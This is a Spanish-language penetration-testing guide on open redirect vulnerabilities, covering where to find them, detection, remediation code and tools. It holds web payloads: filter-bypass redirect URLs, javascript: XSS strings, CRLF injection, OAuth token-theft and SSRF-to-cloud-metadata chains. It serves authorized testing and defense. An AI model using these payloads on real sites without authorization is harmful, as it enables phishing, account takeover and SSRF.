# Redirección abierta (Open Redirect)

| Clasificación | |
|---|---|
| CWE | CWE-601 — Redirección de URL a un sitio no confiable (Open Redirect) |
| OWASP Top 10:2025 | A01 — Broken Access Control |
| OWASP API Top 10:2023 | API10 — Unsafe Consumption of APIs (si el servidor sigue redirecciones de terceros); en general no aplica |
| WSTG | WSTG-CLNT-04 (redirección del lado del cliente); también aplica a redirecciones del servidor |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación (servidor 3xx, cliente JS, ruta, Referer, meta refresh) · 5. Evasión de validaciones (lista de cargas) · 6. Escalada (OAuth, SSRF, XSS `javascript:`, phishing, CRLF) · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

La aplicación redirige al usuario a una URL que viene de la entrada (parámetro, ruta, cabecera) sin comprobar que el destino sea de confianza. El enlace empieza en el dominio legítimo, así que inspira confianza, pero acaba en un sitio del atacante.

Formas de redirigir:

- **Del lado del servidor**: respuesta `301/302/303/307/308` con cabecera `Location`.
- **Del lado del cliente**: JavaScript (`location.href = param`, `window.open`), `<meta http-equiv="refresh">`, o enrutadores de SPA. Aquí además puede haber **XSS** si se acepta `javascript:`.

Causas típicas: validar con `startsWith`/`includes`/regex en lugar de analizar la URL; que el validador y el navegador **interpreten la URL de forma distinta** (barras invertidas, `@`, caracteres de control, codificaciones); listas blancas por sufijo de dominio.

Por sí sola suele ser de severidad baja; su valor real está en las **cadenas**: robo de códigos/tokens OAuth, saltar listas blancas de SSRF, phishing creíble, XSS.

## 2. Dónde buscar (señales del reconocimiento)

- Nombres de parámetro: `url`, `uri`, `redirect`, `redirect_uri`, `redirect_url`, `redirectTo`, `redir`, `return`, `returnTo`, `return_url`, `returnUrl`, `next`, `continue`, `dest`, `destination`, `goto`, `go`, `target`, `to`, `out`, `view`, `forward`, `callback`, `checkout_url`, `success_url`, `cancel_url`, `RelayState`, `service`, `login_hint` (a veces), `image_url`/`load_url` (más bien SSRF).
- Flujos: login/logout, SSO (SAML `RelayState`, CAS `service`), OAuth (`redirect_uri`, `post_logout_redirect_uri`), pasarelas de pago, confirmación de correo, cambio de idioma, «compartir», acortadores, rastreo de clics en correos (`/click?u=`), páginas de descarga.
- Rutas que contienen URLs: `/redirect/https://…`, `/out/…`, `/r/…`, `/link?…`.
- Barra final y normalización: servidores que redirigen `//evil.example/` (rutas con doble barra).
- JavaScript: `location.href =`, `location.assign(`, `location.replace(`, `window.open(`, `router.push(` con datos de `URLSearchParams`.
- Histórico de URLs (`gau`, `waybackurls`) filtrado por parámetros con `=http` o `=%2F`.

## 3. Detección segura (primeras sondas, no destructivas)

Usar un dominio propio inocuo (o `example.com`) como destino. Desactivar el seguimiento de redirecciones para ver la cabecera:

```bash
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' 'https://t.example/login?next=https://example.com/'
curl -s -D - -o /dev/null 'https://t.example/login?next=//example.com/' | grep -i '^location'
```

1. Probar destino absoluto, relativo de protocolo (`//`), y las variantes de la sección 5.
2. Revisar redirecciones **tras el login** (el parámetro se guarda en sesión y se usa después).
3. Para redirecciones del cliente, abrir en navegador y vigilar la navegación (DevTools → Network, «Preserve log»).
4. Cambiar la cabecera `Referer` en páginas que «vuelven a donde venías».
5. Si el destino es `javascript:`, probar `javascript:alert(document.domain)` solo en redirecciones de cliente (en 3xx el navegador no ejecuta `javascript:`).

## 4. Explotación por contexto o tecnología

### 4.1 Redirección de servidor (3xx)

```text
https://t.example/redirect?url=https://evil.example
https://t.example/login?next=//evil.example
https://t.example/logout?returnTo=https://evil.example
https://t.example/sso/login?RelayState=https://evil.example
```

### 4.2 Redirección de cliente (JavaScript) → posible XSS

```javascript
// código vulnerable
location.href = new URLSearchParams(location.search).get('next');
```
```text
https://t.example/app?next=javascript:alert(document.domain)
https://t.example/app?next=javascript://%0aalert(document.domain)
https://t.example/app?next=JaVaScRiPt:alert(1)
https://t.example/app?next=%09javascript:alert(1)
https://t.example/app?next=java%0d%0ascript:alert(1)
```

`data:text/html,…` como navegación de nivel superior está bloqueada en Chrome y Firefox modernos.

### 4.3 Redirección en la ruta

```text
https://t.example//evil.example/
https://t.example/%2F%2Fevil.example
https://t.example/redirect/https:%2F%2Fevil.example
https://t.example/\evil.example
```

### 4.4 Basada en Referer

```http
GET /back HTTP/1.1
Host: t.example
Referer: https://evil.example/
```

### 4.5 Meta refresh / cabecera Refresh

```http
Refresh: 0; url=https://evil.example
```
Revisar también inyección en `<meta http-equiv="refresh" content="0;url=VALOR">`.

### 4.6 Plataformas concretas

- **OAuth/OIDC**: `redirect_uri` con validación por prefijo o por dominio, y `post_logout_redirect_uri` (ver `vulns/oauth-oidc-saml.md`).
- **SAML**: `RelayState` suele ser una URL libre tras el login.
- **CAS**: `service=` en `/login`.
- **Apps móviles / deep links**: `intent://…#Intent;scheme=…;end`, enlaces universales con *fallback* web, esquemas personalizados (`myapp://`).

## 5. Evasión de filtros y validaciones

Se aprovecha que el validador del servidor y el navegador (parser WHATWG) entienden la URL de forma distinta. Sustituir `t.example` por el dominio permitido y `evil.example` por el del auditor.

```text
# Relativas de protocolo y barras
//evil.example
///evil.example
////evil.example
/\evil.example
\/\/evil.example
/\/evil.example
\\evil.example
/%5cevil.example
/%2f%2fevil.example
/%09/evil.example
/%0a/evil.example                    # según servidor
https:evil.example
https:/evil.example
https:\\evil.example
https;//evil.example                # algunos backends lo normalizan

# Userinfo (@) y confusión de parser
https://t.example@evil.example
https://t.example%40evil.example
https://t.example:443@evil.example
https://evil.example\@t.example      # navegador: host evil.example; algunos parsers de servidor: t.example
https://evil.example%5c@t.example
https://evil.example%23@t.example
https://t.example%2F@evil.example

# Sufijo, prefijo y "contiene"
https://t.example.evil.example
https://evil.example/t.example
https://evil.example?t.example
https://evil.example#t.example
https://evil.example/.t.example
https://evilt.example                # registrar dominio que termina igual
https://t.example-evil.example

# Codificaciones
https%3A%2F%2Fevil.example
%2F%2Fevil.example
%252F%252Fevil.example               # doble decodificación entre capas
https://evil%E3%80%82example         # punto ideográfico (U+3002) que el navegador normaliza a "."
https://evil。example
https://ⓔⓥⓘⓛ.example                # Unicode que normaliza (IDNA) a letras ASCII
〱evil.example

# Caracteres de control y espacios que el navegador elimina
%09//evil.example
%20//evil.example
//evil.example%00.t.example          # backends antiguos
java%09script:alert(1)               # solo cliente

# Formatos de IP (para destinos IP o cadenas SSRF)
http://2130706433                    # 127.0.0.1 en decimal
http://0x7f000001
http://0177.0.0.1
http://[::ffff:127.0.0.1]
```

Si la validación es por lista blanca de rutas relativas (`next` debe empezar por `/`): `//evil.example`, `/\evil.example`, `/%09/evil.example` siguen empezando por `/`.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

### 6.1 Robo de código o token OAuth

Si el proveedor permite cualquier ruta del dominio del cliente en `redirect_uri` (validación por prefijo/dominio) y el cliente tiene una redirección abierta:

```text
https://idp.example/authorize?client_id=APP&response_type=code&scope=openid
  &redirect_uri=https://t.example/login/callback/../../redirect?url=https://evil.example
  &state=xyz
```

- En flujos con `response_type=token` (implícito) el token va en el **fragmento**; los navegadores **conservan el fragmento** al seguir una redirección 3xx cuyo `Location` no trae fragmento, así que llega a `evil.example`.
- Con `code`, el código llega en la query a la página de redirección y puede filtrarse a `evil.example` vía `Referer` o vía el propio parámetro.
- ⚠️ Usar exclusivamente la cuenta de prueba del auditor; un código o token capturado de un usuario real sería un incidente. **Requiere confirmación explícita del cliente** si el flujo involucra un IdP de terceros en producción.

### 6.2 Saltar listas blancas de SSRF

Si el servidor solo permite peticiones a `t.example` pero sigue redirecciones:

```text
https://t.example/api/fetch?url=https://t.example/redirect?url=http://169.254.169.254/latest/meta-data/
```
Demostrar con un endpoint inocuo propio (OAST) antes de tocar metadatos en la nube; ver `vulns/ssrf.md`.

### 6.3 XSS mediante `javascript:`

En redirecciones del cliente (sección 4.2) el impacto es el de un XSS reflejado: ver `vulns/xss.md`.

### 6.4 Inyección CRLF en la cabecera Location

```text
https://t.example/redirect?url=/%0d%0aSet-Cookie:%20poc=1
https://t.example/redirect?url=/%0d%0a%0d%0a<script>alert(document.domain)</script>
```
Ver `vulns/otras-inyecciones.md` (inyección de cabeceras / *response splitting*).

### 6.5 Otros

- **Phishing creíble**: el enlace es del dominio legítimo. Demostrarlo con una página propia inocua («Página de prueba de auditoría»), nunca con un formulario de credenciales clonado.
- **Saltar validaciones de dominio** de otros sistemas: filtros de enlaces en chats y correo, previsualizadores, y CSP. En CSP, tras una redirección solo se compara el host del destino y se ignora la ruta, así que una redirección abierta en un host permitido puede alcanzar rutas no permitidas de otro host de la lista (por ejemplo, un endpoint JSONP).
- **Login CSRF / fijación de sesión** combinados con redirección tras login.

## 7. Caja blanca: fuentes, sumideros y patrones de código

| Tecnología | Sumidero | Patrón seguro |
|---|---|---|
| Express | `res.redirect(req.query.next)` | Lista blanca o solo rutas relativas validadas |
| Django | `HttpResponseRedirect(request.GET['next'])`, `redirect(next)` | `url_has_allowed_host_and_scheme(next, allowed_hosts={request.get_host()}, require_https=True)` |
| Flask | `redirect(request.args.get('next'))` | Validar con `urlparse` (host vacío y ruta que no empiece por `//` ni `/\`) |
| Spring | `"redirect:" + url`, `response.sendRedirect(url)`, `RedirectView(url)` | Mapear identificadores a URLs fijas |
| ASP.NET Core | `Redirect(returnUrl)` | `LocalRedirect(returnUrl)` o `Url.IsLocalUrl(returnUrl)` |
| Rails | `redirect_to params[:url]` | `redirect_to url, allow_other_host: false` (por defecto en Rails 7+) / `url_from(params[:url])` |
| Laravel | `redirect($request->input('url'))`, `redirect()->away(...)` | `redirect()->intended()` con validación, rutas con nombre |
| PHP | `header('Location: ' . $_GET['url'])` | Lista blanca |
| Next.js | `redirect(searchParams.get('next'))`, `NextResponse.redirect(new URL(next, req.url))` | Validar origen del `URL` resultante |
| Cliente | `location.href/assign/replace`, `window.open`, `router.push` | `new URL(x, location.origin).origin === location.origin` |

```python
# Flask — validación correcta para rutas internas
from urllib.parse import urlsplit
def safe_next(n):
    if not n: return '/'
    n = n.replace('\\', '/')
    p = urlsplit(n)
    if p.scheme or p.netloc or not n.startswith('/') or n.startswith('//'):
        return '/'
    return n
```

```bash
rg -n 'res\.redirect\(|sendRedirect\(|"redirect:"\s*\+|RedirectView\(|HttpResponseRedirect\(|redirect\(\s*request\.|redirect_to\s+params|header\(\s*["'\'']Location:|->away\(|Redirect\(\s*\w*[Uu]rl|location\.(href|assign|replace)\s*[=(]|window\.open\('
rg -n 'next|returnUrl|return_to|redirect_uri|RelayState' -g '*.{py,js,ts,java,cs,rb,php,go}' | rg -i 'request|query|params|args|getParameter'
```

```bash
semgrep --config p/owasp-top-ten --config p/express --config p/django --config p/flask .   # reglas de open redirect incluidas
```

## 8. Falsos positivos frecuentes

- Redirección a una página **intermedia de aviso** («Vas a salir de t.example») que exige clic: menor impacto (reportar como bajo o informativo).
- El parámetro se refleja en `Location` pero el servidor antepone su dominio (`Location: https://t.example//evil.example` → sigue en `t.example`). Comprobar en navegador, no solo leyendo la cabecera.
- Redirección que solo funciona con `POST` sin forma de inducirla desde un enlace.
- Redirecciones a dominios de la propia organización por diseño (lista blanca correcta).
- `javascript:` en una cabecera `Location`: los navegadores no lo ejecutan.

## 9. Evidencia mínima para validarlo

- URL completa de prueba y respuesta con `Location` (o grabación de la navegación en cliente).
- Captura del navegador terminando en el dominio del auditor (página inocua).
- Para cadenas: petición y respuesta de cada paso (por ejemplo, autorización OAuth → redirección → código recibido en el servidor del auditor, con la cuenta de prueba), y versión de navegador.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario | CVSS 3.1 | CVSS 4.0 (calcular con la calculadora de FIRST) |
|---|---|---|
| Redirección abierta aislada | `AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N` = 4.7 (muchos registros NVD usan `C:L/I:L` = 6.1) | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N` |
| Redirección de cliente con `javascript:` (XSS) | Como XSS reflejado: 6.1 o más | Ver `vulns/xss.md` |
| Robo de token/código OAuth → toma de cuenta | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` = 8.1 (`AC:H` si requiere condiciones) | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Salto de lista blanca SSRF | Según impacto SSRF (ver `vulns/ssrf.md`) | — |

## 11. Remediación (con ejemplo de código correcto)

1. Evitar destinos controlados por el usuario: usar **identificadores** que el servidor mapea a URLs fijas (`?dest=perfil` → `/account/profile`).
2. Si se necesitan rutas internas: aceptar solo rutas relativas analizadas con un parser real, rechazando `//`, `/\`, esquemas y caracteres de control.
3. Si se necesitan dominios externos: lista blanca de **orígenes exactos** comparados tras `new URL()` / `urlsplit`.
4. Página intermedia de aviso para salidas a dominios externos.
5. OAuth: registro de `redirect_uri` exactos (comparación literal) y PKCE.
6. En el cliente, permitir solo `http:`/`https:` del propio origen.

```javascript
// Express
const ALLOWED_ORIGINS = new Set(['https://t.example', 'https://help.t.example']);
function safeRedirect(req, res) {
  let u;
  try { u = new URL(String(req.query.next || '/'), 'https://t.example'); } catch { return res.redirect('/'); }
  if (!['https:'].includes(u.protocol) || !ALLOWED_ORIGINS.has(u.origin)) return res.redirect('/');
  return res.redirect(u.href);
}
```

```csharp
// ASP.NET Core
if (Url.IsLocalUrl(returnUrl)) return LocalRedirect(returnUrl);
return RedirectToAction("Index", "Home");
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso | Cuándo |
|---|---|---|
| Burp Repeater / `curl` sin seguir redirecciones | Pruebas manuales de la sección 5 | Siempre, primero |
| Burp Intruder con la lista de la sección 5 | Variar cargas sobre un parámetro confirmado | Tras identificar el parámetro |
| `gau` / `waybackurls` + `grep -iE '(url|next|redirect|return)='` | Descubrir parámetros históricos | Reconocimiento |
| OpenRedireX | `python3 openredirex.py -l urls.txt -p payloads.txt` (sintaxis según versión) | Triaje masivo, con autorización |
| DOM Invader | Redirecciones del cliente | SPA |
| Burp Collaborator / interactsh | Confirmar SSRF vía redirección | Cadenas |

## 13. Referencias

- OWASP Unvalidated Redirects and Forwards Cheat Sheet; WSTG-CLNT-04.
- PortSwigger Web Security Academy — DOM-based open redirection; OAuth authentication (robo de tokens con redirect_uri); SSRF con open redirect.
- RFC 6749 §10.15 y *OAuth 2.0 Security Best Current Practice* (RFC 9700) — redirecciones abiertas.
- WHATWG URL Standard (análisis de barras invertidas, caracteres de control).
- PayloadsAllTheThings — *Open Redirect*.
- HackTricks — *Open Redirect*.
- CWE-601.
- Adaptado en parte de SnailSploit *offensive-checklist* (licencia MIT).
